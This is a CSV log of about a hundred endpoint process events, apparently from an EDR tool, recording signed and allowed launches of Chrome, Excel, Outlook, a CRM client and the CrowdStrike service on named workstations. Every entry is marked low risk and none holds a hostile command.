event_id,timestamp,asset_id,user_id,parent_process,process_name,command_line,sha256,signature_status,edr_action,risk_level
P00420,2026-09-12 10:03:12,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",abc73646e61e2da4e2e1943efa4d33648cddf42b4ab5e1a91028fabf8ec2c5db,signed,ALLOWED,Low
P00421,2026-09-12 10:07:44,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c532a26cbeb9fa03e96d3a37570f2c577e894385cd4b9686283744f94d2500f6,signed,ALLOWED,Low
P00422,2026-09-12 10:48:13,WKST-FIN-004,tshivute,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",0aa060e0908e2cc285e8a817c4f35b00d6913525b2632f901c56e0daf8cc4f79,signed,ALLOWED,Low
P00423,2026-09-12 10:52:35,WKST-CS-006,nnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",9ac8cb344efc2eea4ca2bd93c9a00895e9b2189906c2107590d76c6aa533677e,signed,ALLOWED,Low
P00424,2026-09-12 10:59:54,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c9ff272cd6c7b543ffd732de950cfd2ba195d5c1019f7a8cd631fb73e03e636f,signed,ALLOWED,Low
P00425,2026-09-12 11:17:37,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",d730c760623e1d95771413364df35c7d57cd4601e178e22bbddbcf93a6e45a96,signed,ALLOWED,Low
P00426,2026-09-12 11:26:54,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",fe7bbeb1222a21fc9344538c6113dad39457ed6b73bbe042f43ad2338cecbb57,signed,ALLOWED,Low
P00427,2026-09-12 11:35:02,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",78fed2a973b3e72e82152be0841903f84f4eda1109bd75cedf1103d16fb148f5,signed,ALLOWED,Low
P00428,2026-09-12 11:50:27,WKST-SOC-003,haufiku,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,889f47ce388e06b389c2b7890bc0a3f6c8f1c0383f92867431ddf34835b9c89e,signed,ALLOWED,Low
P00429,2026-09-12 11:58:55,WKST-CMP-009,kndjavera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",72663b32bfb17d3e0a4b8b14253b0e224500abd70f348b1d0a532ee2588fece5,signed,ALLOWED,Low
P00430,2026-09-12 12:00:10,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",07cdf37e067f8f8405df259245de59f706a0e3e21842dc71fa2da8ba41b8d30a,signed,ALLOWED,Low
P00431,2026-09-12 12:02:06,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",674c1e25dd36eeb016b087d1390b6e16a7ec2f1306f2fe1a7d558586ef4448d3,signed,ALLOWED,Low
P00432,2026-09-12 12:17:17,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",0b729154ab8d6756583a4c6e7c449f928db0a3683ccd245a855667a5fea0803d,signed,ALLOWED,Low
P00433,2026-09-12 12:18:58,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,688155792a21f1c63cbf1c82ef07421daf4df0cd36fa26532a9e929c79abc8d5,signed,ALLOWED,Low
P00434,2026-09-12 12:22:15,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",3a3e7b6a8d19a93eb194abb4c5b16f9dee36828fc195e6a00ac5600784efa94c,signed,ALLOWED,Low
P00435,2026-09-12 12:40:21,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d617ad8127eb1e2752c834623ba89ff747273502940fcd5eefc23a00d2bfb5a9,signed,ALLOWED,Low
P00436,2026-09-12 12:40:35,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ce0a038eb8fa9f444db1691ddc58c80a77a60a537f605f3c775ac3461f103f01,signed,ALLOWED,Low
P00437,2026-09-12 12:46:05,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",0db237a1cdae31183c74e657439244eb35218e11b0c57d6b21986b342b37ba00,signed,ALLOWED,Low
P00438,2026-09-12 13:48:05,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6d4e076154dd826191bfc91f65f65728956de412b47ca3171440490f6f844474,signed,ALLOWED,Low
P00439,2026-09-12 13:51:24,WKST-CS-017,mhaingura,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",1d6efa3347672b833d9e8652a772a05b107b786f439a16176c43760b9a84b78d,signed,ALLOWED,Low
P00440,2026-09-12 14:17:53,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6ef158bd6f6447d21f5dd50c46e0d3e320672cf3039870636e172a8ccc241bda,signed,ALLOWED,Low
P00441,2026-09-12 14:22:09,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",7f831a0c27db4b959cbbf7063f3d30e9df2733cd113bca13019db9ca57881d0f,signed,ALLOWED,Low
P00442,2026-09-12 14:38:26,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d3f35142941cf0f5ba80abd405431b7520d89b79afa0097dea620da84d257f1f,signed,ALLOWED,Low
P00443,2026-09-12 14:43:15,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",301f0f5434521793f0453feb0b27ab70597fa0ef6cbdf0e76d098c56169717bd,signed,ALLOWED,Low
P00444,2026-09-12 14:47:02,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",0094819eb93e1b32f282f0e4e5a22c7fb1a96832bc18159bf2f844a5686f98f4,signed,ALLOWED,Low
P00445,2026-09-12 14:47:31,WKST-EXE-002,shapaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",5deb1d040972984382a045121d94042c46df0425c4856d69126cc6b35518362a,signed,ALLOWED,Low
P00446,2026-09-12 14:57:22,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,fdc791ec4337662c048f423fb57bbd554d8163fe196afcc24161374c15a47579,signed,ALLOWED,Low
P00447,2026-09-12 15:08:44,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",8ef2d0bac406535d84e8ad77c5225d423115bfc6c21ebe5584837163423dd4c9,signed,ALLOWED,Low
P00448,2026-09-12 15:20:22,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",304db29fa7e5fa7b91775ef0f2d477fb7443dca93512626b2e92e59119fbdf9e,signed,ALLOWED,Low
P00449,2026-09-12 15:46:12,WKST-CS-017,mhaingura,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2c0541432fe21c8c07cee885c78ce2f9c1912aea04b01a0179465b6c016360e5,signed,ALLOWED,Low
P00450,2026-09-12 15:55:02,WKST-CMP-009,kndjavera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",71b4158c47a2bd9a5c1e2568c3734a03e437eb0096aaa9beb4e7d59067ed8be3,signed,ALLOWED,Low
P00451,2026-09-12 15:57:45,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d80d33a61cee9e5615f31267b4f5b6a447bf4190eb80f8e528105c15899e8af7,signed,ALLOWED,Low
P00452,2026-09-12 16:02:02,WKST-EXE-002,shapaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3ee71b1ab872991db22bfc4826655c06b8953973e9b2a63436ef12348400c29e,signed,ALLOWED,Low
P00453,2026-09-12 16:02:48,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",87641e83fb8e777800d5943133636222bf9e7bf72ccf9f10b43d8c03f0440ea5,signed,ALLOWED,Low
P00454,2026-09-12 16:10:29,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",eb7c00ef28c61c6fe70358c3be0f40599fdb466ffe0a6f55ad8f78ac9d4b6cc2,signed,ALLOWED,Low
P00455,2026-09-12 16:17:06,WKST-SOC-003,haufiku,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",75f62db212c3fa00c04ae9401ecf5419c258ab0caada8673251669b5ee547b3a,signed,ALLOWED,Low
P00456,2026-09-12 16:18:13,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,26214642335d90b51568370295ea714f619558c9e3c732cccc1de91e4c4004f3,signed,ALLOWED,Low
P00457,2026-09-12 16:24:45,WKST-TRY-007,hamukwaya,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",419ff7fde8cfd4e5c2b17b0deac76d863e40c73c4cffb3dac84450036e0cef72,signed,ALLOWED,Low
P00458,2026-09-12 16:25:50,WKST-CMP-003,amupanda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f6e7ddfc0b270c694865ce56468b1412beeb4f19e0eb18d28696ef4966b75be8,signed,ALLOWED,Low
P00459,2026-09-12 16:29:36,WKST-CS-006,nnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",cefe1df794ec860e789dbe9f3f1ef7bca558f88fc37f63952361e82379c6c324,signed,ALLOWED,Low
P00460,2026-09-12 16:41:21,WKST-SWK-008,sihuhua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6c2416b44667a52d17991422ee108fe3f8f488a0ab96c48600abd971586c0ad3,signed,ALLOWED,Low
P00461,2026-09-12 16:53:09,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",48e55cc53187daf6214c036e36cd9915b42c5ec50733431d801863aa4c436347,signed,ALLOWED,Low
P00462,2026-09-12 16:57:36,WKST-CS-017,mhaingura,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",fe92e2ddf15abe4dab77ad4ade5df1c13398ffc7d43c815a21d1f1f25a566334,signed,ALLOWED,Low
P00463,2026-09-12 17:00:25,WKST-CS-006,nnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",9bdb439936d1519105066c6f6f56f368ff679a311d79986f8714bff3b23ab199,signed,ALLOWED,Low
P00464,2026-09-12 17:03:41,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8eebc945d3f355d6be5a38065d150dd92dfa044da3f7743551d7d4a885ad53dd,signed,ALLOWED,Low
P00465,2026-09-12 17:05:28,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2177f31a348ac7790fc186bb9ba27480d582f3ece3a93dce5963ce2c4b724af0,signed,ALLOWED,Low
P00466,2026-09-12 17:18:16,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ed6361fb96bc3167f0ed65bcec47df61a5788bccca4790403b258d96f866d854,signed,ALLOWED,Low
P00467,2026-09-12 17:23:56,WKST-CMP-003,amupanda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c6bcbb73d21b0bafe65aafcddf357e1119c92bd7d0be65e81a3ecd2a76ff180d,signed,ALLOWED,Low
P00468,2026-09-12 17:27:04,WKST-HR-002,pnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",5a660bb84bb5c35214e922a18e91a5402e0625febf7d192ecbac34a07dc636b7,signed,ALLOWED,Low
P00469,2026-09-12 17:31:00,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",951f48d4bcef66278aebddf95985d54d68bd207cf19cccfe28f00f501501dd7e,signed,ALLOWED,Low
P00470,2026-09-12 17:32:05,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",34ec22636d5ea711b41e25c956b200ea8f5faa56d1c6fa9244d4bbe6ad95f4fb,signed,ALLOWED,Low
P00471,2026-09-12 18:14:07,WKST-HR-002,pnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",83d6c757905c60818fd87949a3d62984da1d659d6385032d27f3bda052b4a4a0,signed,ALLOWED,Low
P00472,2026-09-12 18:14:40,WKST-LOAN-018,shilongo,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f31923206de3c5459ccb98e92d3d3b2994ae17487d42d823b5fe3fff0d94e9d8,signed,ALLOWED,Low
P00473,2026-09-12 18:34:36,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",6a61c0e61f9ade6caa40c358b861134d06bdbad26c0d685f2c7223743c128d67,signed,ALLOWED,Low
P00474,2026-09-12 18:37:18,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",f49f08413c9b63aa4e51f109331e0da3adcaae1e224c4f7da4be4eef44ddde3d,signed,ALLOWED,Low
P00475,2026-09-12 18:39:23,WKST-HR-014,mukwambi,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",763f7d83163dfe7710bea9d1f60cd6eeda868791c4d4aead0d8911b5372e0cbd,signed,ALLOWED,Low
P00476,2026-09-12 19:00:04,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5f1e2d656968913ef72cec6a6955dd691c3127b8e216ebe586e0c2ce4604dcd1,signed,ALLOWED,Low
P00477,2026-09-12 19:01:46,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",88a889d54f6f92485357ba5446fee3ddc69c5c9260c9453d84108e128958359a,signed,ALLOWED,Low
P00478,2026-09-12 19:07:11,WKST-SWK-002,nduminga,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,55f123d6c4f253d33b6d9b00ada9005a81cf32dd0813a69fd1d3a82f34725507,signed,ALLOWED,Low
P00479,2026-09-12 19:09:37,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",5a413ef09c7f38cd71092cf6b36b0b04006edc0f59d9b703ef3ed926ee634ad6,signed,ALLOWED,Low
P00480,2026-09-12 19:19:37,WKST-RSK-006,murorua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",cfbc2fc3b5f7af93eaf2226e197170f932f65cbd133299ca63225276fd6965f2,signed,ALLOWED,Low
P00481,2026-09-12 19:20:14,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",0e6d210baaffdb7fcf80c30fd4ba30a43e8f2f0b88e0e53ba432507bc4e6d721,signed,ALLOWED,Low
P00482,2026-09-12 19:20:49,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",b0bd95ba031c9293c08769ae4a9a318e4be92e142a352e3eb85dc4a7a8361b2d,signed,ALLOWED,Low
P00483,2026-09-12 19:21:14,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3b892d30c2f3e415de1e9a0629dbc9a1906307915eb88855b41fbb46c64e51b3,signed,ALLOWED,Low
P00484,2026-09-12 19:24:47,WKST-EXE-002,shapaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",9267bb4d1a2cdfaaa7b8a6a9407789ca6b50c26b0c0f8cf0dad69f5395193c4a,signed,ALLOWED,Low
P00485,2026-09-12 19:26:20,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5b9b72e35f829c0c7fb06273159c3879ef5e216b0df50eddf13f87b91896f47e,signed,ALLOWED,Low
P00486,2026-09-12 19:35:31,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",529a063d2cc2c69c910c83b50251ecfa2a8df3842bfa979ee2943646d40f546f,signed,ALLOWED,Low
P00487,2026-09-12 19:36:26,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2f4fe59452614725d1bb90ff43c3f30bbe72e60400f4a057da94dda1acb34503,signed,ALLOWED,Low
P00488,2026-09-12 19:59:08,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",34926ef09571470d0144264945386e5a99ca8039544c89878b18234d4c7f1677,signed,ALLOWED,Low
P00489,2026-09-13 06:53:37,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",de332a6d00fbc90bd697e4933775128b1e3fdef1baf92c827c89d549696c80bc,signed,ALLOWED,Low
P00490,2026-09-13 06:56:04,WKST-EXE-002,shapaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,27304965da64e7728b5529e0872100e9399bdce7de5eb6d1b835bc0a7adc8c7f,signed,ALLOWED,Low
P00491,2026-09-13 06:58:13,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",b36208327ea5f29f14eb493e90b5a16476c29ff77fba6bbc46c27af17cb80f99,signed,ALLOWED,Low
P00492,2026-09-13 07:07:05,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",e4fc0959270d93e5c5134e156db800c62c56553839dcc94dabb278fd158632c7,signed,ALLOWED,Low
P00493,2026-09-13 07:17:37,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",52a3ba84c6474bbd5061b4c0c007ad78524e2ceda7e8db351551bc92ed935819,signed,ALLOWED,Low
P00494,2026-09-13 07:49:12,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d1ea123103e35a04be392d68d355e4744035279ce6b90194f6c130118d639380,signed,ALLOWED,Low
P00495,2026-09-13 07:50:26,WKST-MKT-010,ntinda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",0ae6f0f37e51f20447e930602aed91e318e7e42d2b8a6cb9580572e3310cec04,signed,ALLOWED,Low
P00496,2026-09-13 08:34:45,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",36907d162622b452fed79f38ec3aae7273149e89f45c59ec37222f3641d4fede,signed,ALLOWED,Low
P00497,2026-09-13 08:53:37,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8613b60c5fa1f6cbc37d1bb47a9765001fc6f3d5761ccf4ef7c7ae2d144c11bc,signed,ALLOWED,Low
P00498,2026-09-13 09:07:30,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f17d957dff3ef1282eb6a852cf5d9db07ce30195801d7b6b58fa2362564d77c0,signed,ALLOWED,Low
P00499,2026-09-13 09:15:09,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",817b3d17950ffd78417501e8b9fc409e057dbb4d79f99ffc4f5b598a7c95b02e,signed,ALLOWED,Low
P00500,2026-09-13 09:20:23,WKST-TRY-007,hamukwaya,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",08cb54f61599af5f4042da17a712f01352a45c1e3d3155c37c9c2ae1eae0f96c,signed,ALLOWED,Low
P00501,2026-09-13 09:33:01,WKST-AUD-004,tjirera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c2dfb7f3a6521d94a21535f6d9d424a31d853753926c8fe91a115df2bb132dab,signed,ALLOWED,Low
P00502,2026-09-13 09:51:22,WKST-EXE-002,shapaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,170949365f6b3f31e625015e195839070f80aa015de3e7fefb9f6de409e96dba,signed,ALLOWED,Low
P00503,2026-09-13 09:52:07,WKST-LGL-005,mbandeka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",de992c6b03d58d6a2f10864816ccbcbeeb7744b40b699aa11f35763ad45addca,signed,ALLOWED,Low
P00504,2026-09-13 09:55:02,WKST-SWK-002,nduminga,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,d23df4f44d1233e1f842aef41ebd3d409c050a21476bea0c3ff71f3503e5c072,signed,ALLOWED,Low
P00505,2026-09-13 09:58:04,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d563ada12c1739776aa7c88a654215ff27dd06493e690330ebe02a574f2b9b70,signed,ALLOWED,Low
P00506,2026-09-13 10:07:09,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",24a2d217d41b391557e4579b24115a2395e7d9278928d128eb3ebfc98f8c4b0a,signed,ALLOWED,Low
P00507,2026-09-13 10:13:42,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a5af90a23aa24c10eaf2555f002cbb31de21fb6747af635b206cca63293fea01,signed,ALLOWED,Low
P00508,2026-09-13 10:25:48,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",771199639a185b1809b1727f158c6db504f1b751e272e948f575a26c2dfd559b,signed,ALLOWED,Low
P00509,2026-09-13 10:26:52,WKST-RSK-006,murorua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8b6722681ca46e4269732435a9e6564c02302901cacfa79db2258e00fe5cd520,signed,ALLOWED,Low
P00510,2026-09-13 10:31:50,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6b800fafd5aee0209ee69a1116d95155467b033badd2459f91159fa6a6063961,signed,ALLOWED,Low
P00511,2026-09-13 10:32:47,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",a3585a664945e807c2fe576341917dda0b0aefe3de026388eef29b54e899b476,signed,ALLOWED,Low
P00512,2026-09-13 10:36:51,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2012bbfd3aedcfe13f8449461fd0a5121b283e145f989dad7aaac1ceeee156ce,signed,ALLOWED,Low
P00513,2026-09-13 10:43:47,WKST-HR-002,pnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",50a0db152c7d34124598694ca1f4c9c57c8f2b1bd827eab50912260e90b1325c,signed,ALLOWED,Low
P00514,2026-09-13 11:06:43,WKST-OND-004,ndjaba,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,e5a32e44fe87d5d38ff08705d503463d5a57eb2f469954349567032d708e664c,signed,ALLOWED,Low
P00515,2026-09-13 11:09:16,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",f626e43e742aa80c6d91120ec99a49eac6045e31e5478ec0d9fd7c829a65691a,signed,ALLOWED,Low
P00516,2026-09-13 11:11:08,WKST-CMP-009,kndjavera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",a5cc7c003f565d5bab568e607c1026a922b7d0e5c1db94cc92fc379275bcfecb,signed,ALLOWED,Low
P00517,2026-09-13 11:16:57,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",6207ec4574b3868be829a058d399a54bb3f1520be5ca7920f52b1bb43081e6d9,signed,ALLOWED,Low
P00518,2026-09-13 11:20:07,WKST-FIN-021,jkavari,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",37811e8aceea1c79941ad05769ac9b321aafac7abdd9aca1fe5427b9d668b01b,signed,ALLOWED,Low
P00519,2026-09-13 11:54:07,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",515aabc39f4314089df7303a9658861c5dffbe2fce012922c795b566e8c30ef4,signed,ALLOWED,Low
P00520,2026-09-13 11:54:26,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e4e71556ca56574e8aa51efd0738fde22af5f24cb54c55e54ceddf6d5b6e4e34,signed,ALLOWED,Low
P00521,2026-09-13 12:08:14,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",81a034b306c832890f5411e9245819347c96840639f88fca21ebe663c494ca03,signed,ALLOWED,Low
P00522,2026-09-13 12:24:09,WKST-CS-006,nnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",68c4dd66409f83b3a1b707a7a6e6664bdf85c97c759e21fefe7654e5418a6085,signed,ALLOWED,Low
P00523,2026-09-13 12:26:12,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ab04d595f80f1f4ce07f6f2a2bffdd4821c7684e04767840a499b16e9b9bebd1,signed,ALLOWED,Low
P00524,2026-09-13 12:42:51,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2211d8f3313ab252f3cf526c742428a90897f98cd3d46698f2e75351bd48288b,signed,ALLOWED,Low
